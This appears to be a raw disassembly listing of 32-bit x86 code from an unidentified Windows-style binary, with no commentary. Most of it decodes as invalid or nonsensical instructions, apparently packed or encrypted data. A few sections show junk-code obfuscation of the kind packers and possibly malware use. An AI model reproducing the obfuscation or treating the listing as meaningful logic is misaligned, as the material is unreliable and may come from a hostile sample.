  4072a0:	ret    
  4072a1:	push   ss
  4072a2:	aam    0xa9
  4072a4:	inc    eax
  4072a5:	js     0x4072f1
  4072a7:	inc    eax
  4072a8:	inc    eax
  4072a9:	sbb    al,0x43
  4072ab:	xchg   ebp,eax
  4072ac:	cmp    eax,0xf7d34076
  4072b1:	add    BYTE PTR [edi+edx*1+0x7125ad67],al
  4072b8:	or     al,0x70
  4072ba:	mov    ch,0xff
  4072bc:	adc    bl,bh
  4072be:	sub    al,BYTE PTR [edi-0x58]
  4072c1:	adc    eax,0x69bfe43d
  4072c6:	dec    eax
  4072c7:	or     edx,DWORD PTR [eax-0x9]
  4072ca:	mov    ds:0xbd901c57,al
  4072cf:	pop    esi
  4072d0:	xor    BYTE PTR [ebx+0x5c5f6e24],bh
  4072d6:	out    0xfd,al
  4072d8:	mov    dh,ah
  4072da:	cmp    esp,0x38b5a2fb
  4072e0:	inc    edi
  4072e1:	xchg   ebp,eax
  4072e2:	dec    esi
  4072e3:	mov    ah,0x3a
  4072e5:	retf   0xe1a2
  4072e8:	xchg   edx,eax
  4072e9:	adc    edx,esp
  4072eb:	ret    0x6e12
  4072ee:	xor    ecx,DWORD PTR [edi+0x31]
  4072f1:	sub    esi,0xe62a73d1
  4072f7:	mov    DWORD PTR [ebp+0x7d],0x6200b542
  4072fe:	rol    DWORD PTR [edi],cl
  407300:	jmp    0xb9d9e520
  407305:	cdq    
  407306:	cmp    ch,BYTE PTR [esi+edi*4]
  407309:	inc    ecx
  40730a:	cmp    esi,DWORD PTR [ecx+0x6c]
  40730d:	sub    edx,DWORD PTR [esi]
  40730f:	(bad)  
  407310:	test   al,0xb1
  407313:	les    ecx,FWORD PTR [edi-0x7dd36f8f]
  407319:	in     eax,dx
  40731a:	jb     0x4072c8
  40731c:	pushf  
  40731d:	xchg   ebp,eax
  40731e:	add    al,0x35
  407320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407321:	mov    bh,0xde
  407323:	stc    
  407324:	mov    ch,0x73
  407326:	dec    edx
  407327:	loop   0x407338
  407329:	push   cs
  40732a:	loop   0x4072e1
  40732c:	fadd   DWORD PTR [edx+edx*8+0x53]
  407330:	push   cs
  407331:	std    
  407332:	pop    ecx
  407333:	push   ss
  407334:	jns    0x407309
  407336:	push   ds
  407337:	sub    al,0x42
  407339:	mov    DWORD PTR [edx+esi*4+0x5861cd6c],ebp
  407340:	repz mov ah,0x72
  407343:	into   
  407344:	out    0x7d,al
  407346:	push   eax
  407347:	mov    eax,DWORD PTR [ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fd51,0x42e783
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fd7d,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e78f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fd7d,0x0
  407384:	mov    eax,ds:0x42fd7d
  407389:	inc    eax
  40738a:	mov    ds:0x42fd7d,eax
  40738f:	cmp    DWORD PTR ds:0x42fd7d,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e4df
  4073a2:	cmp    DWORD PTR ds:0x42fd7d,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fd7d
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fd7d,eax
  4073ba:	cmp    DWORD PTR ds:0x42fd7d,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e1a8,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e787,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	cld    
  4073fc:	mov    esi,0xcff7fbe8
  407401:	jo     0x407473
  407403:	and    BYTE PTR [ebp+0x70],bh
  407406:	jo     0x40746c
  407408:	ror    BYTE PTR [edi-0xbad299f],cl
  40740e:	dec    edx
  40740f:	push   ebp
  407410:	je     0x407429
  407412:	ret    0x47ac
  407415:	jg     0x407446
  407417:	xor    edi,DWORD PTR [ebp+0x6619c154]
  40741d:	pop    ebp
  40741e:	sar    BYTE PTR [edi+0x53],0xa8
  407422:	retf   
  407423:	popa   
  407424:	imul   BYTE PTR [esi+0x1f]
  407427:	nop
  407428:	cmp    BYTE PTR [ecx-0x56],al
  40742b:	mov    WORD PTR [edi+0x5],ss
  40742e:	test   DWORD PTR [ebx-0x7626b3db],0xe6e8260c
  407438:	mov    BYTE PTR [ebp+edi*2+0x6c],cl
  40743c:	js     0x4073f9
  40743e:	xor    al,0x7f
  407440:	xchg   edi,eax
  407441:	and    BYTE PTR [edi+esi*4],bl
  407444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407445:	fisttp QWORD PTR [ebx]
  407447:	jnp    0x407478
  407449:	sub    ebx,esp
  40744b:	pusha  
  40744c:	adc    BYTE PTR [esi+0x5],0x85
  407450:	data16 mov al,ds:0xfe2665a4
  407456:	add    eax,0x847e8a9d
  40745b:	cld    
  40745c:	mov    bh,bl
  40745e:	fcomp  DWORD PTR [edx+0x5a]
  407461:	inc    ebx
  407462:	daa    
  407463:	outs   dx,BYTE PTR ds:[esi]
  407464:	xchg   ebp,eax
  407465:	fldenv [esi-0x3204800f]
  40746b:	or     eax,0xdb97c12a
  407470:	mov    BYTE PTR [eax],al
  407472:	xor    ah,bl
  407474:	jae    0x40748d
  407476:	les    eax,FWORD PTR [edi+edi*4]
  407479:	xchg   ebp,eax
  40747a:	xchg   edx,eax
  40747b:	adc    esi,DWORD PTR [eax]
  40747d:	cmp    BYTE PTR [esi-0x1caa1cf],0xe3
  407484:	sbb    eax,0x3393f588
  407489:	cmc    
  40748a:	xlat   BYTE PTR ds:[ebx]
  40748b:	pop    edx
  40748c:	shr    BYTE PTR [eax-0x79],0xb4
  407490:	add    esp,DWORD PTR [edx]
  407492:	hlt    
  407493:	cld    
  407494:	pop    edi
  407495:	push   ecx
  407496:	das    
  407497:	scas   eax,DWORD PTR es:[edi]
  407498:	mov    bh,0x12
  40749b:	out    0xb3,eax
  40749d:	xor    al,ch
  40749f:	or     al,0xf8
  4074a1:	and    dh,BYTE PTR [esi-0x1adf0505]
  4074a7:	out    dx,eax
  4074a8:	js     0x4074a8
  4074aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074ab:	ret    0xe0c3
  4074ae:	add    ecx,DWORD PTR [edx+0x5bade147]
  4074b4:	mov    dh,0xd6
  4074b6:	adc    cl,BYTE PTR [ebx+0x5f]
  4074b9:	je     0x407452
  4074bb:	mov    bl,0xb
  4074bd:	dec    ebp
  4074be:	push   cs
  4074bf:	dec    edx
  4074c0:	hlt    
  4074c1:	mul    DWORD PTR [eax+esi*2+0x25]
  4074c5:	push   ds
  4074c6:	cmc    
  4074c7:	pop    es
  4074c8:	jbe    0x407491
  4074ca:	jg     0x407508
  4074cc:	je     0x407488
  4074ce:	mov    DWORD PTR [esi],esi
  4074d0:	aam    0xc2
  4074d2:	cwde   
  4074d3:	retf   0xdb5f
  4074d6:	cmc    
  4074d7:	les    ecx,FWORD PTR [ecx+0x52]
  4074da:	mov    al,ds:0x9f736691
  4074df:	lahf   
  4074e0:	or     al,0x7f
  4074e2:	test   al,0x57
  4074e4:	icebp  
  4074e5:	clc    
  4074e6:	outs   dx,BYTE PTR ds:[esi]
  4074e7:	inc    ecx
  4074e8:	pusha  
  4074e9:	cmp    cl,dl
  4074eb:	fsubr  st,st(5)
  4074ed:	jnp    0x40747a
  4074ef:	sub    ebx,esi
  4074f1:	out    0x46,eax
  4074f3:	(bad)  
  4074f4:	cld    
  4074f5:	sti    
  4074f6:	stos   DWORD PTR es:[edi],eax
  4074f7:	js     0x407562
  4074f9:	(bad)  
  4074fb:	cwde   
  4074fc:	ret    0x579e
  4074ff:	sbb    eax,esp
  407501:	dec    ecx
  407502:	(bad)  
  407503:	lods   eax,DWORD PTR ds:[esi]
  407504:	mov    dl,BYTE PTR [ebx]
  407506:	arpl   WORD PTR [edx+esi*2-0x37],bx
  40750a:	and    DWORD PTR ds:0xf6dd6d5a,0x73
  407511:	xchg   ecx,eax
  407512:	add    esi,DWORD PTR [eax+ebx*1]
  407515:	dec    ebx
  407516:	cwde   
  407517:	mov    ch,0xb
  407519:	add    eax,0xbe525429
  40751e:	data16 arpl WORD PTR [edx-0x4b4aed6],di
  407525:	and    BYTE PTR [esi-0x6d],dl
  407528:	ror    BYTE PTR [edx+0x5b],cl
  40752b:	adc    al,0xd8
  40752d:	sub    eax,0x9145553c
  407532:	mov    dh,0x94
  407534:	mov    WORD PTR [edx],ds
  407536:	sub    eax,0xccfec0fa
  40753b:	(bad)
  40753e:	jecxz  0x40755a
  407540:	mov    DWORD PTR [eax-0x2],ebp
  407543:	and    dh,BYTE PTR [eax]
  407545:	scas   al,BYTE PTR es:[edi]
  407546:	push   ecx
  407547:	push   0x46
  407549:	(bad)  
  40754b:	sub    DWORD PTR [edi],ebx
  40754d:	xchg   esp,eax
  40754e:	mov    ?,WORD PTR [ebp-0x42]
  407551:	test   eax,0x380bc25f
  407556:	aad    0xa3
  407558:	call   0x5518c475
  40755d:	mov    ds:0x2d618f6,al
  407562:	jb     0x407573
  407564:	sbb    BYTE PTR [eax-0x4d2fafd5],bh
  40756a:	aad    0xc1
  40756c:	jle    0x40750f
  40756e:	dec    ebx
  40756f:	dec    ebp
  407570:	sub    DWORD PTR [ecx-0x381dae4b],eax
  407576:	cmp    ah,BYTE PTR [esp+edx*2-0x29]
  40757a:	and    ah,BYTE PTR [ecx+eax*8-0x2398d3f5]
  407581:	dec    esp
  407582:	mov    eax,DWORD PTR [edx+0x1c14b414]
  407588:	inc    esi
  407589:	mov    bl,0xbc
  40758b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40758c:	shl    BYTE PTR [ebx],1
  40758e:	(bad)  
  40758f:	sbb    BYTE PTR [edx],cl
  407591:	jbe    0x407592
  407593:	jb     0x407538
  407595:	add    BYTE PTR [eax+0x3e85f4dc],al
  40759b:	push   eax
  40759c:	dec    esi
  40759d:	(bad)  
  40759e:	loopne 0x40756d
  4075a0:	pop    ss
  4075a1:	int    0xc9
  4075a3:	add    al,0xb9
  4075a5:	loop   0x407531
  4075a7:	ret    0x740
  4075aa:	pop    ecx
  4075ab:	sbb    BYTE PTR [ebx-0x6744d1cd],cl
  4075b1:	gs inc edx
  4075b3:	adc    BYTE PTR es:[edi+0x7113dfcb],al
  4075ba:	jecxz  0x407542
  4075bc:	repnz int3 
  4075be:	je     0x4075d2
  4075c0:	test   DWORD PTR [esi-0x7b],0x6c2d8385
  4075c7:	mov    ss,WORD PTR [ebp+0x53]
  4075ca:	pop    ebp
  4075cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075cc:	inc    esi
  4075cd:	scas   eax,DWORD PTR es:[edi]
  4075ce:	shl    DWORD PTR [ebx+0x2a598dad],0xc4
  4075d5:	fbstp  TBYTE PTR [ebp-0x2d9ff49d]
  4075db:	lock or edi,DWORD PTR [eax]
  4075de:	or     eax,0x69459e6d
  4075e3:	jne    0x407641
  4075e5:	jns    0x40757a
  4075e7:	daa    
  4075e8:	adc    eax,0x22ef82ab
  4075ed:	and    dl,BYTE PTR [ecx-0x7b]
  4075f0:	dec    ebx
  4075f1:	gs jp  0x407666
  4075f4:	add    al,0xe4
  4075f6:	mov    ebx,0x7a351064
  4075fb:	stos   DWORD PTR es:[edi],eax
  4075fc:	(bad)
  4075ff:	pusha  
  407600:	jge    0x4075d1
  407602:	shl    bh,cl
  407604:	mov    dh,0x5d
  407606:	push   esp
  407607:	iret   
  407608:	fadd   DWORD PTR [edi+0x45]
  40760b:	cmp    eax,0xa4fccf53
  407610:	int    0xe
  407612:	dec    esp
  407613:	cmp    cl,BYTE PTR [edx+eiz*2+0x6074b5e2]
  40761a:	sbb    eax,0x62d1f08a
  40761f:	sub    BYTE PTR [ebx+eiz*2-0x6f],ah
  407623:	sub    BYTE PTR [edi-0x6a8d6eb5],cl
  407629:	sbb    edx,0xfffffffb
  40762c:	jno    0x407647
  40762e:	js     0x4075b9
  407630:	arpl   WORD PTR [ebp+0x37],cx
  407633:	fist   DWORD PTR [eax+edi*2+0x84c908a]
  40763a:	cwde   
  40763b:	adc    DWORD PTR [ebx+edi*1-0xf],ebp
  40763f:	xor    bh,BYTE PTR [edi+0x1c]
  407642:	xor    DWORD PTR [edi-0x6d],edi
  407645:	cmp    cl,dh
  407647:	or     eax,0x871a60a1
  40764c:	adc    BYTE PTR [esi+0x26344dad],0xb3
  407653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407654:	dec    eax
  407655:	call   0x44fc6f9b
  40765a:	pop    es
  40765b:	loop   0x4076ab
  40765d:	pop    ebx
  40765e:	mov    bl,0x47
  407660:	pop    edi
  407661:	xor    eax,0xbbbf592f
  407666:	test   eax,0x93c9b81c
  40766b:	mov    ebx,0x45a5b494
  407670:	gs pop ebx
  407672:	daa    
  407673:	iret   
  407674:	cs in  ax,0xd6
  407678:	sub    ecx,DWORD PTR [esi-0x65d4f09c]
  40767e:	jmp    0x57da:0x1f9311d1
  407685:	loope  0x4076f3
  407687:	les    ebp,FWORD PTR [ebx]
  407689:	mov    edi,0xd4cc93a2
  40768e:	jp     0x4076e7
  407690:	mov    ebx,DWORD PTR [eax-0xa34b7d7]
  407696:	cmp    esi,edx
  407698:	in     eax,0x19
  40769a:	iret   
  40769b:	fist   DWORD PTR [edx-0xe1d1b1c]
  4076a1:	mov    cl,0xa6
  4076a3:	push   cs
  4076a4:	mov    al,ds:0x24803667
  4076a9:	xchg   edx,ecx
  4076ab:	das    
  4076ac:	or     BYTE PTR [ebx],0x3
  4076af:	add    bl,BYTE PTR [edx-0x1]
  4076b2:	xor    edi,DWORD PTR [edx+0x4e]
  4076b5:	xor    cl,BYTE PTR [ecx-0x173a0d1c]
  4076bb:	push   esi
  4076bc:	mov    al,0x2f
  4076be:	adc    cl,ch
  4076c0:	ror    DWORD PTR [ebp+0x7ce3bb1d],1
  4076c6:	inc    eax
  4076c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c8:	in     eax,dx
  4076c9:	pop    esp
  4076ca:	test   DWORD PTR [edx+0x20],edx
  4076cd:	lods   al,BYTE PTR ds:[esi]
  4076ce:	push   cs
  4076cf:	xor    eax,0x7d9b6954
  4076d4:	imul   BYTE PTR [ebx]
  4076d6:	inc    eax
  4076d7:	cli    
  4076d8:	xor    BYTE PTR [edx],0xb6
  4076db:	push   eax
  4076dc:	push   edx
  4076dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076df:	xor    dl,BYTE PTR [ebx]
  4076e1:	ror    dl,cl
  4076e3:	loopne 0x407701
  4076e5:	mov    esi,?
  4076e7:	add    cl,BYTE PTR [ecx]
  4076e9:	adc    eax,0xad4d127a
  4076ee:	mov    esi,0x6f1c7864
  4076f3:	mov    al,0x15
  4076f5:	jl     0x407720
  4076f7:	ins    DWORD PTR es:[edi],dx
  4076f8:	jno    0x407707
  4076fa:	inc    ecx
  4076fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076fc:	mov    ch,0x2f
  4076fe:	mov    esp,0xc58e6f28
  407703:	xchg   DWORD PTR [esi],ebp
  407705:	fild   DWORD PTR [ecx-0x1faafc07]
  40770b:	pop    esp
  40770c:	mov    ecx,DWORD PTR [esi-0x21f0eb5e]
  407712:	int    0xa
  407714:	jmp    0x4076de
  407716:	call   0xc1ce3ac8
  40771b:	sbb    DWORD PTR [edi-0x40],0xffffffd3
  40771f:	retf   0x781c
  407722:	sub    bh,0x9c
  407725:	pop    esi
  407726:	frstpm(287 only) 
  407728:	iret   
  407729:	arpl   WORD PTR [ecx],cx
  40772b:	repnz das 
  40772d:	repz pop ebp
  40772f:	mov    cl,0x6b
  407731:	fldcw  WORD PTR [edi]
  407733:	xor    DWORD PTR [ebp-0x3],0xdc458b6f
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e19c,0x42fd89
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fd51,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e76f,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fd71,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e78f,0x42e76b
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e77f,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e783,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fd65,0x42fdee
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fe02,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	ss stos DWORD PTR es:[edi],eax
  4077db:	lahf   
  4077dc:	out    0xa7,eax
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x40784e
  4077e6:	js     0x4077c3
  4077e8:	(bad)  
  4077e9:	hlt    
  4077ea:	xor    BYTE PTR [ebx+ebp*2-0x5f],dh
  4077ee:	fdivr  DWORD PTR [ebx-0x44]
  4077f1:	and    cl,ah
  4077f3:	cmp    eax,0x39bd1a6f
  4077f8:	stos   DWORD PTR es:[edi],eax
  4077f9:	pop    edx
  4077fa:	ja     0x4077b9
  4077fc:	mov    ah,BYTE PTR [ebp+ebp*4-0x51]
  407800:	dec    edi
  407801:	fnstcw WORD PTR [eax+ebx*2-0x63044d2e]
  407808:	dec    esp
  407809:	push   ebx
  40780a:	mov    fs,WORD PTR gs:[edx+0x2da9c96b]
  407811:	cli    
  407812:	sub    DWORD PTR [esi],esi
  407814:	(bad)  
  407815:	jg     0x4077c3
  407817:	fninit 
  407819:	out    dx,eax
  40781a:	mov    al,0xbd
  40781c:	adc    BYTE PTR [ebx+0x58fdebee],0x95
  407823:	jmp    0x40787c
  407825:	push   edx
  407826:	cmp    cl,BYTE PTR [edi]
  407828:	imul   ecx,DWORD PTR [edi+eiz*8+0x5a],0x79
  40782d:	jmp    0x407840
  40782f:	rol    BYTE PTR [eax-0x6b1bf54f],1
  407835:	mov    ds:0x8392c0d9,al
  40783a:	popa   
  40783b:	ror    BYTE PTR cs:[ebx-0x4c],cl
  40783f:	(bad)  
  407840:	sub    edi,DWORD PTR [edi-0x76]
  407843:	icebp  
  407844:	cmp    al,0x8d
  407846:	cmp    DWORD PTR [ecx-0x6a0b977d],esi
  40784c:	pusha  
  40784d:	popf   
  40784e:	inc    eax
  40784f:	add    dl,0xa3
  407852:	leave  
  407853:	loopne 0x4078a8
  407855:	fsubr  QWORD PTR [ecx]
  407857:	retf   
  407858:	das    
  407859:	jbe    0x407892
  40785b:	jle    0x4078bc
  40785d:	js     0x407862
  40785f:	push   ds
  407860:	mov    ecx,0x35d7178c
  407865:	clc    
  407866:	clc    
  407867:	mov    esp,0xee775085
  40786c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40786d:	jae    0x40782f
  40786f:	xor    DWORD PTR [edx-0x33],0xffffffec
  407873:	and    BYTE PTR [eax],bh
  407875:	mov    dl,BYTE PTR [edx-0x449adf30]
  40787b:	or     al,0x46
  40787d:	push   eax
  40787e:	fimul  DWORD PTR [ecx]
  407880:	adc    al,0x48
  407882:	jmp    0x176cda10
  407887:	fadd   QWORD PTR [ebp+0x57]
  40788a:	sahf   
  40788b:	test   al,0x68
  40788d:	pop    ebx
  40788e:	sbb    al,0x99
  407890:	fistp  WORD PTR [ebx]
  407892:	jg     0x4078c2
  407894:	stos   BYTE PTR es:[edi],al
  407895:	mov    eax,0x296a8cd
  40789a:	nop
  40789b:	(bad)  
  40789c:	out    dx,eax
  40789d:	xor    edx,DWORD PTR ds:0xe886139a
  4078a3:	neg    BYTE PTR ds:[eax]
  4078a6:	pop    eax
  4078a7:	test   BYTE PTR fs:[esi],ch
  4078aa:	xchg   edi,eax
  4078ab:	add    al,0xfe
  4078ad:	mov    ds:0xb4ff6c16,eax
  4078b2:	les    ebp,FWORD PTR [edi+0x4df83b22]
  4078b8:	mov    ch,0x72
  4078ba:	or     al,0x66
  4078bc:	out    0xf,al
  4078be:	out    dx,al
  4078bf:	sub    BYTE PTR [eax],ah
  4078c1:	enter  0x939,0x7b
  4078c5:	add    ch,dh
  4078c7:	push   ecx
  4078c8:	mov    eax,0xf71bc158
  4078cd:	and    BYTE PTR [edi+0x5a79c700],cl
  4078d3:	pop    es
  4078d4:	dec    eax
  4078d5:	repnz and cl,BYTE PTR [eax]
  4078d8:	mov    esi,0x3ca8d580
  4078dd:	and    edi,DWORD PTR [ebx+0x6c20a99d]
  4078e3:	sub    al,0x14
  4078e5:	mov    ecx,0xfb1a011f
  4078ea:	repnz push 0x73
  4078ed:	jne    0x4078da
  4078ef:	fcmovbe st,st(7)
  4078f1:	jmp    0x407961
  4078f3:	cmp    bh,BYTE PTR [ecx+0x1d889808]
  4078f9:	imul   eax,esi,0x65157678
  4078ff:	mov    bh,0xcc
  407901:	sub    dl,BYTE PTR [ebx+eiz*4-0x11dbdc06]
  407908:	and    DWORD PTR [edx-0x31],eax
  40790b:	aas    
  40790c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40790d:	xchg   esp,eax
  40790e:	int    0x39
  407910:	pop    ds
  407911:	cmp    cl,bl
  407913:	pop    es
  407914:	clc    
  407915:	mov    eax,ds:0xf678be6c
  40791a:	cli    
  40791b:	mov    edx,0xafbfd9d8
  407920:	cld    
  407921:	(bad)  
  407922:	mov    dl,0xb0
  407924:	pusha  
  407925:	(bad)  
  407928:	(bad)  
  407929:	sahf   
  40792a:	in     eax,dx
  40792b:	dec    ebx
  40792c:	jno    0x407977
  40792e:	das    
  40792f:	push   esi
  407930:	std    
  407931:	out    0x4c,al
  407933:	or     eax,0x83ab007c
  407938:	cmp    ecx,ebp
  40793a:	popf   
  40793b:	sub    bh,BYTE PTR [esi-0xe15f651]
  407941:	xchg   ebx,eax
  407942:	jg     0x40793c
  407944:	scas   eax,DWORD PTR es:[edi]
  407945:	fadd   QWORD PTR [ebp+0x10]
  407948:	aam    0x30
  40794a:	xchg   ecx,eax
  40794b:	and    BYTE PTR [eax+0x2d],bh
  40794e:	jmp    0xf81f:0x31f766ae
  407955:	rcl    DWORD PTR [ebp-0x2e],0x44
  407959:	lds    ebp,FWORD PTR [edx+0xe]
  40795c:	mov    edi,0x59d45598
  407961:	or     ch,cl
  407963:	xor    cl,BYTE PTR [eax-0x4c5a1f6e]
  407969:	aam    0x7b
  40796b:	addr16 cmp eax,esi
  40796e:	das    
  40796f:	inc    DWORD PTR [edx]
  407971:	js     0x4079a9
  407973:	or     esp,DWORD PTR [eax+0x41]
  407976:	cmp    dl,bl
  407978:	sub    BYTE PTR [ebx+0x19],al
  40797b:	pop    eax
  40797c:	in     al,dx
  40797d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40797e:	push   0xe5bb62e6
  407983:	jp     0x4079ce
  407985:	jnp    0x40793c
  407987:	out    dx,al
  407988:	xor    BYTE PTR [ebx-0x540a952a],dh
  40798e:	and    ah,al
  407990:	or     al,0xa7
  407992:	(bad)  
  407993:	mov    al,0x3
  407995:	jo     0x4079f0
  407997:	push   0xe1952fd7
  40799c:	aad    0x73
  40799e:	or     ch,BYTE PTR [edx-0x10454e48]
  4079a4:	xor    BYTE PTR ds:[esi],0x18
  4079a8:	xor    ebx,DWORD PTR ds:0xd1c2171a
  4079ae:	mov    bl,0x9e
  4079b0:	mov    ch,0xd6
  4079b2:	leave  
  4079b3:	jmp    FWORD PTR [ebp+0x22]
  4079b6:	clc    
  4079b7:	ins    BYTE PTR es:[edi],dx
  4079b8:	jg     0x407a2c
  4079ba:	lods   eax,DWORD PTR ds:[esi]
  4079bb:	sar    dl,cl
  4079bd:	sahf   
  4079be:	and    bl,BYTE PTR [ecx]
  4079c0:	lds    ebp,FWORD PTR [edi-0x2f]
  4079c3:	out    dx,eax
  4079c4:	jbe    0x407966
  4079c6:	mov    cl,0xac
  4079c8:	mov    al,ds:0xa8083513
  4079cd:	push   esp
  4079ce:	hlt    
  4079cf:	xchg   edx,eax
  4079d0:	inc    ebp
  4079d1:	retf   
  4079d2:	icebp  
  4079d3:	push   es
  4079d4:	or     ch,bh
  4079d6:	repnz and eax,ecx
  4079d9:	test   DWORD PTR [edi],eax
  4079db:	pusha  
  4079dc:	and    al,0x32
  4079de:	xchg   al,dh
  4079e0:	ficomp DWORD PTR [eax]
  4079e2:	out    0xea,eax
  4079e4:	inc    ebx
  4079e5:	in     al,0x4
  4079e7:	pop    ebx
  4079e8:	or     al,0xfe
  4079ea:	mov    esi,0xb04a3a70
  4079ef:	shl    bl,0xe3
  4079f2:	ret    0x9365
  4079f5:	mov    cl,0x82
  4079f7:	test   BYTE PTR [eax-0x7b3bddac],bh
  4079fd:	xchg   edi,eax
  4079fe:	fistp  QWORD PTR [eax+0xf]
  407a01:	lock (bad) 
  407a03:	push   ecx
  407a04:	cs je  0x40799b
  407a07:	mov    ds:0x7539ab7a,al
  407a0c:	adc    dh,cl
  407a0e:	hlt    
  407a0f:	out    0x52,eax
  407a11:	jmp    0x81ce:0xa17ae548
  407a18:	or     DWORD PTR [ebp+0x6e],esi
  407a1b:	mov    bh,0x9e
  407a1d:	paddd  mm0,QWORD PTR [ecx+0x41]
  407a21:	add    ebx,DWORD PTR [edi]
  407a23:	(bad)  
  407a24:	push   eax
  407a25:	shl    ebp,0x2d
  407a28:	push   edx
  407a29:	xlat   BYTE PTR ds:[ebx]
  407a2a:	lahf   
  407a2b:	push   0xfffffff3
  407a2d:	test   al,0xdc
  407a2f:	jecxz  0x407a0c
  407a31:	add    al,0x99
  407a33:	data16 sub BYTE PTR [esi],bl
  407a36:	leave  
  407a37:	xor    al,0xcb
  407a39:	pop    edi
  407a3a:	inc    esi
  407a3b:	and    ebx,DWORD PTR [edx]
  407a3d:	sbb    ebx,DWORD PTR [edx+0x62]
  407a40:	retf   0x30bc
  407a43:	mov    edx,0xa9842910
  407a48:	ret    0x9c4b
  407a4b:	cmp    dl,BYTE PTR [ecx+edi*1]
  407a4e:	or     DWORD PTR [edi+ebp*1-0x37],edi
  407a52:	pop    eax
  407a53:	pop    esp
  407a54:	scas   eax,DWORD PTR es:[edi]
  407a55:	lock xlat BYTE PTR ds:[ebx]
  407a57:	mov    dl,0xff
  407a59:	sub    BYTE PTR [ecx+0x3],bl
  407a5c:	data16 (bad) 
  407a5e:	fst    st(3)
  407a60:	int    0xc2
  407a62:	out    dx,eax
  407a63:	cld    
  407a64:	addr16 sbb eax,0x8e6adf1e
  407a6a:	int    0x7e
  407a6c:	ss sub al,0x47
  407a6f:	or     eax,0xc0bc38ec
  407a74:	cmp    DWORD PTR [ebx-0x59],ebp
  407a77:	(bad)  
  407a78:	lock fsubr DWORD PTR [ecx]
  407a7b:	retf   0x3ad1
  407a7e:	mov    eax,0xf6e78512
  407a83:	and    ebp,DWORD PTR [ebx+0x4f]
  407a86:	add    edx,DWORD PTR [ebp-0xf]
  407a89:	jmp    0x407a19
  407a8b:	rcl    DWORD PTR [esi],cl
  407a8d:	fidiv  WORD PTR [edx+0x1b]
  407a90:	out    dx,al
  407a91:	adc    DWORD PTR ds:0x6aff7e49,edx
  407a97:	shr    BYTE PTR [eax],0x52
  407a9a:	call   0x29a2:0x6def0b78
  407aa1:	shl    BYTE PTR [eax+0x424d93a5],cl
  407aa7:	iret   
  407aa8:	lods   eax,DWORD PTR ds:[esi]
  407aa9:	in     al,0xa8
  407aab:	or     dl,ch
  407aad:	leave  
  407aae:	adc    al,0x1
  407ab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ab1:	cmp    ch,BYTE PTR [edx+0x3a]
  407ab4:	ds icebp 
  407ab6:	jno    0x407a52
  407ab8:	js     0x407aee
  407aba:	mov    edx,0xb1356c10
  407abf:	inc    edx
  407ac0:	jge    0x407a70
  407ac2:	jp     0x407a47
  407ac4:	add    ebx,edx
  407ac6:	cmp    DWORD PTR ds:0x6489d23f,0x39
  407acd:	push   0xfa50552a
  407ad2:	adc    eax,0x14c088e
